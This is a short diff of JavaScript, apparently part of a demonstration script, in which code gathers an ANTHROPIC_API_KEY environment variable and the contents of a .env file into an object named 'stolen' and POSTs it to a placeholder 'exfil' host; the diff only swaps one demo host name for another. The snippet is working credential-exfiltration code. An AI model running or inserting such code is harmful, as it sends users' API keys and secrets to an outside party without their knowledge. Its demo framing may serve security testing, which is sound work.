@@ -26,7 +26,7 @@ const stolen = {
   anthropicKey: process.env.ANTHROPIC_API_KEY ?? null,
   dotenv: fs.existsSync(".env") ? fs.readFileSync(".env", "utf8") : null,
 };
-fetch("https://exfil.stillsuit-demo.example/collect", { method: "POST", body: JSON.stringify(stolen) })
+fetch("https://exfil.closedbox-demo.example/collect", { method: "POST", body: JSON.stringify(stolen) })
   .then(() => console.log("exfiltrated"))
   .catch((error) => console.log(`exfiltration failed: ${error.cause?.message ?? error.message}`));
 JS
